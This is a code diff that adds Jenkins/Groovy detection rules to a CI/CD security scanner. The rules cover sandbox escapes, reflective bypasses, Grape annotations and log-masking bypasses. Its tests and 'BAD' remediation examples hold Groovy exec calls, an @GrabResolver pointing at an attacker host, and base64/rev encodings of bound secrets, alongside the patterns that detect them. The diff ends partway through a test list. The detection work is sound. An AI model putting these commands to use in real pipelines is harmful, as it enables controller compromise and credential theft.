@@ -464,6 +464,373 @@ class _GrabSandboxEscapePattern:
         return out
 
 
+class _MaskedGroovyLinePattern:
+    """Shared base for the sandbox-bypass family (SEC4-JK-012/013/014).
+
+    Every member fires on a *single, unambiguous* Groovy sandbox-escape
+    primitive, and every member must avoid the two false-positive classes
+    that the lab corpus proved are real for this rule family:
+
+      1. the primitive appearing inside a string literal / GString / comment
+         (e.g. a remediation snippet in a docstring, a log message mentioning
+         ``Runtime.getRuntime``);
+      2. a benign homonym in legitimate shared-library code (``stage.execute()``
+         on a domain object, ``Jenkins.instance.pluginManager`` plugin-mgmt).
+
+    (1) is handled here by reusing the Groovy code-mask
+    (:func:`taintly.jenkinsguard._groovy_code_mask`) so a match only counts
+    when its anchor character sits in real code position.  (2) is handled by
+    each subclass's regex being narrow enough that the benign homonyms never
+    match (see ``_PRIMITIVE_RE`` docstrings) — verified at 0/871 corpus files.
+    """
+
+    _PRIMITIVE_RE: re.Pattern[str]
+
+    def _anchor_offset(self, m: re.Match[str]) -> int:
+        """Offset (within the matched line) of the character whose code/string
+        position decides whether the match is real code.
+
+        Default = match start.  Subclasses whose match deliberately begins on a
+        string delimiter (e.g. the ``"cmd"`` receiver of ``"cmd".execute()``)
+        override this to point at the *keyword* token (``execute``), which is
+        the part that must live in code position — the quoted receiver is, by
+        design, inside a string.
+        """
+        return m.start()
+
+    def check(self, content: str, _lines: list[str]) -> list[tuple[int, str]]:
+        from taintly.jenkinsguard import _groovy_code_mask
+
+        mask = _groovy_code_mask(content)
+        out: list[tuple[int, str]] = []
+        offset = 0
+        for i, line in enumerate(content.split("\n"), 1):
+            line_start = offset
+            offset += len(line) + 1
+            for m in self._PRIMITIVE_RE.finditer(line):
+                pos = line_start + self._anchor_offset(m)
+                # The anchor character must be real code, not inside a
+                # string/comment region.  This is what stops a finding from
+                # firing on the primitive quoted inside a log message or a
+                # block comment.
+                if pos < len(mask) and not mask[pos]:
+                    continue
+                out.append((i, line.strip()))
+                break  # one finding per line is enough evidence
+        return out
+
+
+class _DirectProcessExecPattern(_MaskedGroovyLinePattern):
+    """SEC4-JK-012 — direct OS process execution from Groovy.
+
+    The Script-Security sandbox blocks process-spawning APIs; these are the
+    canonical Groovy command-exec signatures that an attacker reaches once the
+    sandbox is bypassed (or in trusted-library / Groovy-console contexts where
+    no sandbox applies).  Anchored on the three unambiguous shapes:
+
+      * ``"<cmd>".execute()`` / ``'<cmd>'.execute()`` / ``${expr}.execute()`` /
+        ``[...].execute()`` — the Groovy String/GString/List process-exec
+        idiom.  Anchored on a **string/GString/list receiver** so the very
+        common benign ``stage.execute()`` / ``request.execute()`` method call
+        on a domain object does NOT fire (22/871 corpus files use the benign
+        form; 0 use the dangerous string-receiver form).
+      * ``Runtime.getRuntime().exec`` / ``Runtime.runtime.exec`` — the classic
+        Java exec sink.
+      * ``new ProcessBuilder(`` — the ProcessBuilder spawn.
+    """
+
+    # Receiver must be a closing quote / brace / bracket immediately before
+    # ``.execute()`` — i.e. a String, GString, or List literal, never a plain
+    # identifier (``stage.execute()``).  ``\)`` is deliberately excluded so a
+    # method-chain like ``stage.run().execute()`` does not fire on the chain.
+    #
+    # The ``kw`` group marks the keyword token (``execute`` / ``exec`` /
+    # ``ProcessBuilder``) whose code-position decides the match: for the
+    # string-receiver ``.execute()`` form the match *starts* on the quote
+    # delimiter (which is correctly inside-string per the Groovy mask), so we
+    # anchor the code-position check on ``kw`` instead.
+    _PRIMITIVE_RE = re.compile(
+        r"""(?x)
+        (?:
+            ["'\]}]\s*\.\s*(?P<kw>execute)\s*\(\s*\)   # "cmd".execute() / [..].execute() / ${..}.execute()
+          | \bRuntime\s*\.\s*(?:getRuntime\s*\(\s*\)|runtime)\s*\.\s*(?P<kw2>exec)\b
+          | \bnew\s+(?P<kw3>ProcessBuilder)\s*\(
+        )
+        """
+    )
+
+    # A live ``@Grab`` anywhere in the file means SEC4-JK-011 already owns the
+    # exec-sink finding (with the richer compile-time-bypass narrative); yield
+    # to it so the @Grab-plus-exec shape is reported once, by the more specific
+    # rule, rather than as two findings on adjacent lines.
+    _GRAB_RE = re.compile(r"@Grab\s*\(")
+
+    def _anchor_offset(self, m: re.Match[str]) -> int:
+        # Anchor on whichever keyword group matched — never on the (possibly
+        # quoted) receiver that begins the ``.execute()`` alternative.
+        for name in ("kw", "kw2", "kw3"):
+            if m.group(name) is not None:
+                return m.start(name)
+        return m.start()
+
+    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
+        from taintly.jenkinsguard import _groovy_code_mask
+
+        # When a live (non-comment) ``@Grab(`` is present, defer the entire
+        # file to SEC4-JK-011 to avoid double-reporting the same sandbox-escape
+        # shape.  Check against the code mask so a commented-out @Grab does not
+        # suppress a real exec sink.
+        mask = _groovy_code_mask(content)
+        for gm in self._GRAB_RE.finditer(content):
+            if gm.start() < len(mask) and mask[gm.start()]:
+                return []
+        return super().check(content, lines)
+
+
+class _ReflectionSandboxBypassPattern(_MaskedGroovyLinePattern):
+    """SEC4-JK-013 — Script-Security reflection / dynamic-compile bypass.
+
+    The SECURITY-1353 (CVE-2019-1003040 / -1003041) escape class: reaching
+    arbitrary method dispatch or runtime Groovy compilation through reflective
+    primitives the sandbox does not (or historically did not) intercept.
+    Anchored on the unambiguous, never-benign signatures only:
+
+      * ``ScriptBytecodeAdapter`` — the Groovy runtime dispatch helper used in
+        the SECURITY-1353 PoC; appears in no legitimate pipeline.
+      * ``.castToType(`` / ``.asType(`` *on a method-closure / class object* —
+        the cast primitive abused to invoke private/blocked methods.  Anchored
+        as ``ScriptBytecodeAdapter.castToType`` OR a standalone ``castToType(``
+        call (not the safe ``x as Type`` operator).
+      * ``MethodClosure`` (the class, not the ``.&m`` operator) — direct
+        construction of a method closure to reach a blocked method.  The bare
+        ``.&method`` *operator* is idiomatic and is NOT matched (4/871 corpus
+        files use the safe operator; 0 reference the MethodClosure class).
+      * ``new GroovyShell(`` ... ``.evaluate`` / ``.parse`` and
+        ``GroovyClassLoader(...).parseClass`` — runtime compilation of a
+        Groovy source string, a code-execution sink distinct from the
+        ``evaluate()`` / ``Eval`` builtins SEC4-JK-003 already covers.
+        Anchored on the *constructor* (``new GroovyShell(`` / ``new
+        GroovyClassLoader(``) + a ``.parse`` / ``.parseClass`` /
+        ``.evaluate`` call, so the benign ``GroovyClassLoader`` *type
+        annotation* (7/871 corpus lines, all in a classloader-cleanup util)
+        does not fire.
+    """
+
+    _PRIMITIVE_RE = re.compile(
+        r"""(?x)
+        (?:
+            \bScriptBytecodeAdapter\b
+          | \bcastToType\s*\(
+          | \bMethodClosure\b
+          | \bnew\s+GroovyShell\s*\(
+          | \.\s*parseClass\s*\(
+        )
+        """
+    )
+
+
+class _GrapeResolverConfigPattern(_MaskedGroovyLinePattern):
+    """SEC4-JK-014 — ``@GrabResolver`` / ``@GrabConfig`` Grape AST annotations.
+
+    Siblings of ``@Grab`` (SEC4-JK-011): they are Grape directives processed by
+    an AST transform at *compile time*, before the Script-Security sandbox
+    engages — the SECURITY-1266 (CVE-2019-1003000) compile-time-bypass root
+    cause.  ``@GrabResolver`` adds an attacker-chosen Maven repository
+    (so ``@Grab`` can pull a JAR from anywhere) and ``@GrabConfig(
+    systemClassLoader=true)`` forces the grabbed JAR onto the system
+    classloader — both materially widen the compile-time RCE surface.
+
+    Distinct from SEC4-JK-011, which fires only on ``@Grab`` + an in-file
+    process-execution class.  These annotations are dangerous on their own
+    (they reconfigure where/how compile-time code loads) and are vanishingly
+    rare in legitimate pipelines (0/871 corpus files), so they fire
+    standalone as recall insurance.  Distinct from SEC3-JK-002 (unversioned
+    ``@Grab`` float): the AST-bypass risk does not depend on a version.
+    """
+
+    _PRIMITIVE_RE = re.compile(r"@Grab(?:Resolver|Config)\s*\(")
+
+
+class _SecretExfilTransformPattern:
+    """SEC6-JK-011 — a credential bound by ``withCredentials`` /
+    ``credentials()`` is run through an **encode / obfuscate transform**
+    inside a shell step (the Jenkins log-masking **bypass**).
+
+    Threat (CICD-SEC-6; Jenkins' own credentials-masking blog + the
+    SECURITY-3547 / CVE-2025-53651 masking-limit advisory family).  Jenkins
+    redacts the *verbatim* secret value from the console log on a best-effort
+    basis.  It cannot redact a *transformed* secret: ``echo $TOKEN | base64``,
+    ``echo $PASS | rev``, ``printf %s "$KEY" | xxd``, ``openssl enc`` of the
+    secret — each emits bytes the SecretPatterns matcher never sees, so the
+    encoded secret slips into the log (and from there into any log-aggregation
+    sink) in plain view of anyone with build-log access.  The decoded value is
+    trivially recoverable.  This is the masking-bypass class that the existing
+    SEC6-JK credential rules miss:
+
+      * SEC6-JK-002 / SEC6-JK-003 catch the DIRECT ``echo $CRED`` / ``println``
+        leak (the verbatim form Jenkins at least *tries* to mask).
+      * SEC4-JK-006 catches the OPPOSITE direction — ``base64 -d | bash``
+        (decode-then-EXECUTE, a supply-chain RCE) — and explicitly treats
+        ``echo $PASSWORD | base64`` (the ENCODE direction) as a negative.
+      * This rule owns the ENCODE / OBFUSCATE-then-leak direction applied to a
+        *bound credential variable*.
+
+    Precision design (verify-first on the 65 credential-binding corpus files):
+    the rule keys on a **transform tool applied to a bound-credential variable**,
+    NOT on "a credential reaches a network call".  The dominant corpus shape is
+    legitimate authenticated egress —
+    ``sh "curl --user \\"$user:$pass\\" ..."`` / ``--cert "$KEY"`` —
+    which passes the secret to the *intended* TLS endpoint and must stay clean.
+    So plain ``curl``/``wget`` are deliberately NOT triggers; only an
+    encode/obfuscate transform of the secret is.  ``base64 -d`` / ``--decode``
+    (the decode direction) is excluded so this never co-fires with SEC4-JK-006.
+
+    Credential variable names come from two sources:
+      * ``withCredentials([... variable: 'X' / passwordVariable: 'X' /
+        usernameVariable: 'X' / keyFileVariable: 'X' / tokenVariable: 'X' ...])``
+        bindings — read structurally from the island walker's named-arg LEAFs;
+      * ``NAME = credentials('id')`` ``environment {}`` assignments — read by a
+        small regex (the walker does not surface env-block assignment names).
+
+    Shell bodies are read structurally (the island walker's ``value_kind=
+    "shell"`` LEAFs), so the transform must sit in an actual ``sh``/``bat``/
+    ``powershell``/``pwsh`` body — never in a comment or an unrelated string
+    literal.  Credential vars are matched file-flat (any transform of a bound
+    secret leaks it regardless of which nested scope the sink sits in), which is
+    the correct soundness boundary for a masking-bypass finding.
+
+    Recall-safety: ADDITIVE.  Reconstructed-fixture-gated recall insurance —
+    0 corpus signal for the transform shape (measured: 0/65 credential-binding
+    files apply an encode transform to a bound secret), 0 FP on the same 65
+    files (all credential-in-sink shapes there are legitimate authenticated
+    egress, which this rule does not target).  Same gate policy as SEC4-JK-011
+    (``@Grab``): real CVE/advisory threat, ship once the FP-on-real-corpus side
+    is proven clean.
+
+    Failure-soft: any walker exception is swallowed to ``[]`` — a scan must
+    never crash on an unmodelled Groovy shape (matches the other JK patterns).
+    """
+
+    # withCredentials binding-variable named args (the variable that holds the
+    # secret value at shell-execution time).
+    _BIND_VAR_KEYS = frozenset(
+        {
+            "variable",
+            "passwordVariable",
+            "usernameVariable",
+            "keyFileVariable",
+            "tokenVariable",
+        }
+    )
+
+    # ``NAME = credentials('id')`` environment{}-block binding — the walker does
+    # not emit env-block assignment names, so read them here.  ALL-CAPS / under-
+    # score env-var convention; the RHS must be a ``credentials(...)`` call.
+    _CREDS_ENV_RE = re.compile(
+        r"\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*credentials\s*\(",
+    )
+
+    # Encode / obfuscate transforms that defeat verbatim log masking.  Each is
+    # anchored so it cannot match an unrelated token (``base64`` inside a path,
+    # ``rev`` inside ``revision``).  ``base64 -d`` / ``--decode`` is the DECODE
+    # direction (SEC4-JK-006's territory) and is excluded via the negative
+    # lookahead so the two rules never co-fire.
+    _TRANSFORM_RE = re.compile(
+        r"(?:"
+        # base64 ENCODE (no -d / --decode flag) — the masking-bypass direction.
+        r"\bbase64\b(?!\s+(?:-d\b|--decode\b))"
+        # byte/hex obfuscators.
+        r"|\bxxd\b|\bod\b|\bhexdump\b"
+        # reverse — classic two-echo masking dodge.
+        r"|\brev\b"
+        # tr-based transliteration / ROT.
+        r"|\btr\s+['\"]?[A-Za-z0-9]"
+        # openssl symmetric ENCODE (exclude the -d decrypt direction).
+        r"|\bopenssl\s+enc\b(?![^|\n]*\s-d\b)"
+        # gpg symmetric / asymmetric encrypt of the secret.
+        r"|\bgpg\b[^|\n]*(?:-c\b|--symmetric\b|-e\b|--encrypt\b)"
+        r")"
+    )
+
+    @staticmethod
+    def _cred_var_referenced(body: str, cred_vars: frozenset[str]) -> str | None:
+        """First bound credential var referenced in ``body`` as a shell/Groovy
+        variable (``$V`` / ``${V}`` / ``%V%`` for bat), else None."""
+        for v in cred_vars:
+            if re.search(r"[$%]\{?" + re.escape(v) + r"\}?", body):
+                return v
+        return None
+
+    def _collect_cred_vars(self, content: str) -> frozenset[str]:
+        cred_vars: set[str] = set()
+        # env-block ``NAME = credentials('id')`` bindings.
+        for m in self._CREDS_ENV_RE.finditer(content):
+            cred_vars.add(m.group(1))
+        # withCredentials([... variable: 'X' ...]) bindings (structural).
+        try:
+            from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile
+
+            # Public walk_jenkinsfile is island-only (no `backend` kwarg); the
+            # island reader is the substrate the JK rule pack reads, identical
+            # to lab's default backend="island".
+            for ev in walk_jenkinsfile(content, recover=True):
+                if ev.kind == EventKind.CUTOFF:
+                    break
+                if (
+                    ev.kind == EventKind.LEAF
+                    and ev.path
+                    and ev.path[-1] in self._BIND_VAR_KEYS
+                    and ev.value
+                ):
+                    cred_vars.add(ev.value)
+        except Exception:  # nosec B110 - never crash a scan on an unmodelled shape
+            pass
+        return frozenset(cred_vars)
+
+    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
+        if "credentials" not in content:
+            # Both binding forms contain the substring ``credentials``;
+            # a file without it cannot bind a secret this rule reasons about.
+            return []
+        cred_vars = self._collect_cred_vars(content)
+        if not cred_vars:
+            return []
+        try:
+            from taintly.parsers.jenkinsfile import EventKind, walk_jenkinsfile
+        except ImportError:  # pragma: no cover - module ships in-tree
+            return []
+        results: list[tuple[int, str]] = []
+        seen: set[tuple[int, str]] = set()
+        try:
+            # Public walk_jenkinsfile is island-only (no `backend` kwarg); the
+            # island reader is the substrate the JK rule pack reads, identical
+            # to lab's default backend="island".
+            for ev in walk_jenkinsfile(content, recover=True):
+                if ev.kind == EventKind.CUTOFF:
+                    break
+                if ev.kind != EventKind.LEAF or ev.value_kind != "shell":
+                    continue
+                body = ev.value
+                if not body:
+                    continue
+                if not self._TRANSFORM_RE.search(body):
+                    continue
+                if self._cred_var_referenced(body, cred_vars) is None:
+                    continue
+                if 0 < ev.line <= len(lines):
+                    snippet = lines[ev.line - 1].strip() or body.strip()
+                else:
+                    snippet = body.strip()
+                key = (ev.line, snippet)
+                if key in seen:
+                    continue
+                seen.add(key)
+                results.append(key)
+        except Exception:  # nosec B110 - walker failures must not break scans
+            return []
+        return results
+
+
 RULES: list[Rule] = [
     # =========================================================================
     # SEC3-JK-001: Shared library loaded without SHA pinning
@@ -790,6 +1157,240 @@ RULES: list[Rule] = [
             "(CVE-2019-1003000): an attacker who controls the pipeline text "
             "achieves arbitrary command execution on the Jenkins controller "
             "with the pipeline's full trust."
+        ),
+    ),
+    # =========================================================================
+    # SEC4-JK-012 — direct OS process execution from Groovy.  SEC4-JK-011 only
+    # fires on @Grab + an exec class; SEC4-JK-003 only on evaluate()/Eval.  The
+    # bare command-exec sinks — String/GString ``.execute()``,
+    # ``Runtime.getRuntime().exec``, ``new ProcessBuilder`` — are the
+    # script-console / sandbox-escape command-exec signatures and were
+    # uncovered as standalone primitives.  String-receiver-anchored so the
+    # benign ``stage.execute()`` domain-object call (22/871 corpus files) does
+    # NOT fire; the dangerous string-receiver form is 0/871 (recall insurance).
+    # =========================================================================
+    Rule(
+        id="SEC4-JK-012",
+        title="Direct OS process execution from Groovy (.execute / Runtime.exec / ProcessBuilder)",
+        severity=Severity.CRITICAL,
+        platform=Platform.JENKINS,
+        owasp_cicd="CICD-SEC-4",
+        confidence="medium",
+        finding_family="Groovy sandbox bypass",
+        description=(
+            "A Jenkinsfile or Groovy pipeline script spawns an operating-system "
+            "process directly through a Groovy/Java exec primitive: a "
+            'String/GString ``.execute()`` (``"cmd".execute()``, '
+            '``"${x}".execute()``), ``Runtime.getRuntime().exec(...)``, or '
+            "``new ProcessBuilder(...)``. These are the canonical Groovy "
+            "command-execution sinks — the same idioms used against the "
+            "``/script`` console and reached once the Script Security sandbox "
+            "is bypassed (or in trusted-library / unsandboxed contexts where no "
+            "sandbox applies). Unlike the supported ``sh`` / ``bat`` steps "
+            "(which run in an agent workspace and respect the build's process "
+            "model), an in-Groovy exec runs on the controller JVM with the "
+            "pipeline's full trust and bypasses the step-level controls. The "
+            "String-receiver ``.execute()`` anchor distinguishes this from the "
+            "common, benign ``stage.execute()`` method call on a domain object, "
+            "which does not fire."
+        ),
+        pattern=_DirectProcessExecPattern(),
+        remediation=(
+            "Never spawn processes directly from Groovy. Use the supported "
+            "``sh`` / ``bat`` / ``powershell`` steps, which run in the agent "
+            "and are visible to Jenkins' process model:\n\n"
+            "// BAD — runs on the controller JVM, outside the sandbox/step model\n"
+            'def out = "curl ${params.URL}".execute().text\n'
+            "Runtime.getRuntime().exec('/bin/sh -c id')\n"
+            "new ProcessBuilder('bash', '-c', 'id').start()\n\n"
+            "// GOOD — agent step, single-quoted body\n"
+            "sh 'id'\n\n"
+            "If you must shell out, do it through a step and keep "
+            "attacker-controlled values out of the command string."
+        ),
+        reference="https://www.jenkins.io/security/advisory/2019-01-08/",
+        test_positive=[
+            'def out = "curl http://x".execute().text',
+            "'id'.execute()",
+            'def p = "${params.CMD}".execute()',
+            "Runtime.getRuntime().exec('id')",
+            "Runtime.runtime.exec('whoami')",
+            "new ProcessBuilder('bash', '-c', 'id').start()",
+            "def r = ['bash', '-c', 'id'].execute()",
+        ],
+        test_negative=[
+            # Benign domain-object method call — the #1 corpus FP class.
+            "stage.execute()",
+            "new CheckoutStage(script, context).execute()",
+            "Map data = request.execute()",
+            "return stage.execute()",
+            # Supported agent step, not an in-Groovy exec.
+            "sh 'id'",
+            # Primitive only inside a comment / string — not live code.
+            "// def out = 'id'.execute()",
+            'echo "do not call Runtime.getRuntime().exec here"',
+        ],
+        stride=["E", "T"],
+        incidents=["CVE-2019-1003000 / SECURITY-1266 (Groovy sandbox escape)"],
+        threat_narrative=(
+            "A Groovy ``.execute()`` / ``Runtime.exec`` / ``ProcessBuilder`` "
+            "call runs an OS process on the Jenkins controller JVM with the "
+            "pipeline's full privilege, outside the ``sh``-step model and "
+            "outside whatever the Script Security sandbox would have blocked. "
+            "An attacker who can influence the command string — or who is "
+            "running unsandboxed trusted-library code — gets arbitrary command "
+            "execution on the controller."
+        ),
+    ),
+    # =========================================================================
+    # SEC4-JK-013 — Script-Security reflection / dynamic-compile bypass
+    # (SECURITY-1353 = CVE-2019-1003040/-1003041).  ScriptBytecodeAdapter /
+    # castToType / MethodClosure (the class) / new GroovyShell(...).parse /
+    # parseClass reach blocked methods or compile Groovy at runtime.  Distinct
+    # from SEC4-JK-003 (evaluate()/Eval builtins).  Anchored on never-benign
+    # signatures only: the bare ``.&m`` operator (4/871 corpus, idiomatic) and
+    # the ``GroovyClassLoader`` type annotation (7/871, a cleanup util) are
+    # deliberately NOT matched.  0/871 corpus signal = recall insurance.
+    # =========================================================================
+    Rule(
+        id="SEC4-JK-013",
+        title="Groovy reflection / dynamic-compile sandbox bypass (ScriptBytecodeAdapter / GroovyShell / castToType)",
+        severity=Severity.CRITICAL,
+        platform=Platform.JENKINS,
+        owasp_cicd="CICD-SEC-4",
+        confidence="medium",
+        finding_family="Groovy sandbox bypass",
+        description=(
+            "A Jenkinsfile or Groovy script reaches arbitrary method dispatch "
+            "or runtime Groovy compilation through a reflective primitive that "
+            "the Script Security sandbox does not reliably intercept — the "
+            "SECURITY-1353 (CVE-2019-1003040 / -1003041) escape class. Detected "
+            "shapes: ``ScriptBytecodeAdapter`` (the Groovy runtime-dispatch "
+            "helper from the published PoC), ``castToType(...)`` (the cast "
+            "abused to invoke private/blocked methods), the ``MethodClosure`` "
+            "class (direct construction to reach a blocked method — distinct "
+            "from the idiomatic ``this.&method`` operator, which is safe and "
+            "does not fire), and ``new GroovyShell(...).parse``/``.evaluate`` / "
+            "``...parseClass(...)`` (compiling and running a Groovy source "
+            "string at runtime). These bypass the script-approval / sandbox "
+            "controls and run with the pipeline's full trust on the controller."
+        ),
+        pattern=_ReflectionSandboxBypassPattern(),
+        remediation=(
+            "Do not use Groovy reflection or runtime compilation in pipelines. "
+            "Replace dynamic dispatch with explicit calls and reviewed shared-"
+            "library functions:\n\n"
+            "// BAD — runtime compile + reflective dispatch bypass the sandbox\n"
+            "new GroovyShell().parse(userSuppliedSource).run()\n"
+            "ScriptBytecodeAdapter.invokeMethodN(...)\n"
+            "obj.metaClass.getMetaMethod('blocked').invoke(obj)  // via MethodClosure\n\n"
+            "// GOOD — explicit, approvable dispatch\n"
+            "if (action == 'deploy') { deploy() }\n\n"
+            "If a genuine need for dynamic behaviour exists, implement it in a "
+            "reviewed global shared library, not via reflection in the "
+            "Jenkinsfile."
+        ),
+        reference="https://www.jenkins.io/security/advisory/2019-02-19/",
+        test_positive=[
+            "ScriptBytecodeAdapter.invokeMethodN(this, String, 'x', args)",
+            "def x = castToType(closure, SomeType)",
+            "import org.codehaus.groovy.runtime.MethodClosure",
+            "new GroovyShell().parse(src).run()",
+            "def cls = new GroovyShell().parseClass(source)",
+            "this.class.classLoader.parseClass(src)",
+        ],
+        test_negative=[
+            # Idiomatic method-closure OPERATOR — safe, must not fire.
+            "return bulkApply(project, resources, this.&pause)",
+            # GroovyClassLoader as a TYPE annotation in a cleanup util — safe.
+            "GroovyClassLoader classloader = (GroovyClassLoader)this.class.getClassLoader()",
+            # metaClass introspection read — not the reflection-invoke escape.
+            "def method = this.usecase.getMetaClass().getMethods()",
+            # Safe Groovy `as` cast operator — not castToType().
+            "def n = value as Integer",
+            # Primitive only inside a comment.
+            "// new GroovyShell().parse(src)",
+        ],
+        stride=["E", "T"],
+        incidents=["CVE-2019-1003040 / CVE-2019-1003041 / SECURITY-1353"],
+        threat_narrative=(
+            "Reflective dispatch (``ScriptBytecodeAdapter`` / ``castToType`` / "
+            "``MethodClosure``) and runtime Groovy compilation "
+            "(``GroovyShell().parse`` / ``parseClass``) were documented "
+            "Script Security sandbox bypasses (CVE-2019-1003040/-1003041). An "
+            "attacker who can place such Groovy in a pipeline or a sandboxed "
+            "script reaches blocked APIs and executes arbitrary code on the "
+            "controller."
+        ),
+    ),
+    # =========================================================================
+    # SEC4-JK-014 — @GrabResolver / @GrabConfig Grape AST annotations.
+    # Siblings of @Grab (SEC4-JK-011): AST transforms applied at COMPILE time,
+    # before the sandbox (SECURITY-1266 / CVE-2019-1003000 root cause).
+    # @GrabResolver adds an attacker-chosen Maven repo; @GrabConfig(
+    # systemClassLoader=true) forces the JAR onto the system classloader.
+    # Both widen the compile-time RCE surface and fire standalone (unlike
+    # SEC4-JK-011's @Grab+exec co-occurrence).  0/871 corpus = recall insurance.
+    # =========================================================================
+    Rule(
+        id="SEC4-JK-014",
+        title="@GrabResolver / @GrabConfig Grape annotation (compile-time sandbox bypass surface)",
+        severity=Severity.HIGH,
+        platform=Platform.JENKINS,
+        owasp_cicd="CICD-SEC-4",
+        confidence="medium",
+        finding_family="Groovy sandbox bypass",
+        description=(
+            "A Jenkinsfile or Groovy script uses ``@GrabResolver`` or "
+            "``@GrabConfig`` — Grape directives processed by an AST transform "
+            "at *compile time*, before the Jenkins Script Security sandbox "
+            "engages (the SECURITY-1266 / CVE-2019-1003000 compile-time-bypass "
+            "root cause). ``@GrabResolver`` registers an additional, "
+            "attacker-choosable Maven repository so a paired ``@Grab`` can pull "
+            "a JAR from anywhere; ``@GrabConfig(systemClassLoader=true)`` forces "
+            "the grabbed JAR onto the system classloader. Both materially widen "
+            "the compile-time code-loading surface that the sandbox cannot "
+            "intercept. Unlike SEC4-JK-011 (which requires ``@Grab`` plus an "
+            "in-file process-execution class) these fire on their own, because "
+            "reconfiguring where/how compile-time dependencies load is itself "
+            "the escalation; and unlike SEC3-JK-002 (unversioned ``@Grab`` "
+            "float) the AST-bypass risk does not depend on a version."
+        ),
+        pattern=_GrapeResolverConfigPattern(),
+        remediation=(
+            "Do not configure Grape from a pipeline. Disable Grape in the "
+            "Script Security sandbox and declare dependencies as reviewed "
+            "Jenkins plugins or in a build tool (Maven/Gradle) run inside an "
+            "agent step:\n\n"
+            "// BAD — reconfigures compile-time dependency loading\n"
+            "@GrabResolver(name='evil', root='https://attacker.example/repo')\n"
+            "@GrabConfig(systemClassLoader=true)\n"
+            "@Grab('org.example:lib:1.0')\n\n"
+            "// GOOD — no Grape; resolve deps in a build tool via a step\n"
+            "sh './gradlew build'"
+        ),
+        reference="https://www.jenkins.io/security/advisory/2019-01-08/",
+        test_positive=[
+            "@GrabResolver(name='internal', root='https://repo.example/m2')",
+            "@GrabConfig(systemClassLoader=true)",
+            "  @GrabResolver('https://attacker.example/repo')",
+        ],
+        test_negative=[
+            # Plain @Grab is SEC3-JK-002 / SEC4-JK-011 territory, not this rule.
+            "@Grab('org.apache.commons:commons-lang3:3.12.0')",
+            # Commented-out annotation — not live code.
+            "// @GrabResolver(name='x', root='https://repo')",
+            # The word in a string / log message, not the annotation.
+            'echo "configure @GrabConfig in your settings"',
+        ],
+        stride=["E", "T"],
+        incidents=["CVE-2019-1003000 / SECURITY-1266 (@Grab/AST compile-time bypass)"],
+        threat_narrative=(
+            "``@GrabResolver`` / ``@GrabConfig`` run at compile time before the "
+            "Script Security sandbox, letting pipeline text point Grape at an "
+            "attacker-controlled Maven repository or push a grabbed JAR onto the "
+            "system classloader — the SECURITY-1266 compile-time bypass that "
+            "reaches arbitrary code execution on the controller."
         ),
     ),
     # =========================================================================
@@ -3984,5 +4585,150 @@ RULES: list[Rule] = [
             "attacker — a classic post-exploitation persistence mechanism where "
             "a modified build script survives to the next pipeline run."
         ),
+    ),
+    # =========================================================================
+    # SEC6-JK-011: bound credential run through an encode/obfuscate transform
+    #              inside a shell step — Jenkins log-masking bypass.
+    # =========================================================================
+    Rule(
+        id="SEC6-JK-011",
+        title=("Bound credential encoded/obfuscated in a shell step (Jenkins log-masking bypass)"),
+        severity=Severity.HIGH,
+        platform=Platform.JENKINS,
+        owasp_cicd="CICD-SEC-6",
+        confidence="medium",
+        finding_family="secret_exposure",
+        description=(
+            "A credential bound by ``withCredentials`` (``variable:`` / "
+            "``passwordVariable:`` / ``usernameVariable:`` / ``keyFileVariable:`` "
+            "/ ``tokenVariable:``) or by a ``NAME = credentials('id')`` "
+            "``environment {}`` assignment is run through an encode / obfuscate "
+            "transform inside a ``sh`` / ``bat`` / ``powershell`` / ``pwsh`` step: "
+            "``base64`` (encode), ``rev``, ``xxd``, ``od``, ``hexdump``, "
+            "``tr``, ``openssl enc``, or ``gpg --encrypt``.\n\n"
+            "Jenkins redacts the *verbatim* secret value from the build console "
+            "log on a best-effort basis. It cannot redact a *transformed* secret "
+            "— ``echo $TOKEN | base64`` emits bytes the SecretPatterns matcher "
+            "never sees, so the encoded secret slips into the log (and into any "
+            "downstream log-aggregation system) in plain view of anyone with "
+            "build-log access. The decoded value is trivially recoverable, so "
+            "this is a full credential disclosure that masking does not catch.\n\n"
+            "This is the masking-bypass class the other SEC6-JK credential rules "
+            "miss: SEC6-JK-002/003 catch the DIRECT ``echo $CRED`` / ``println`` "
+            "leak (the verbatim form Jenkins at least tries to mask), and "
+            "SEC4-JK-006 catches the OPPOSITE direction (``base64 -d | bash`` = "
+            "decode-then-execute). Plain ``curl``/``wget`` of a credential are "
+            "deliberately NOT flagged here — passing a secret to its intended "
+            "authenticated endpoint over TLS is the dominant, legitimate shape; "
+            "only an encode/obfuscate transform of the secret is the finding."
+        ),
+        pattern=_SecretExfilTransformPattern(),
+        remediation=(
+            "Never transform a bound credential in a shell step. If the secret "
+            "must be encoded for a downstream API, do it inside the tool that "
+            "consumes it (so the plaintext never enters a shell command line), "
+            "and keep the variable inside a SINGLE-quoted Groovy string so "
+            "Groovy never interpolates the literal value:\n\n"
+            "// BAD — base64 of the secret defeats Jenkins log masking\n"
+            "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
+            '    sh "echo $TOKEN | base64 > token.b64"\n'
+            "}\n\n"
+            "// GOOD — let the client library handle the auth header; never\n"
+            "// echo or transform the secret in a shell command.\n"
+            "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
+            "    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n"
+            "}"
+        ),
+        reference="https://www.jenkins.io/blog/2019/02/21/credentials-masking/",
+        test_positive=[
+            # base64 encode of a string-bound token.
+            (
+                "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
+                '    sh "echo $TOKEN | base64 > token.b64"\n'
+                "}"
+            ),
+            # rev of a usernamePassword passwordVariable.
+            (
+                "withCredentials([usernamePassword(credentialsId: 'c', "
+                "usernameVariable: 'U', passwordVariable: 'PASS')]) {\n"
+                "    sh 'echo $PASS | rev'\n"
+                "}"
+            ),
+            # xxd hex-dump of the secret.
+            (
+                "withCredentials([string(credentialsId: 'k', variable: 'API_KEY')]) {\n"
+                '    sh "printf %s \\"$API_KEY\\" | xxd"\n'
+                "}"
+            ),
+            # openssl enc of the secret piped onward.
+            (
+                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
+                '    sh "echo $TOKEN | openssl enc -base64"\n'
+                "}"
+            ),
+            # credentials() env-block binding + base64 in a stage step.
+            (
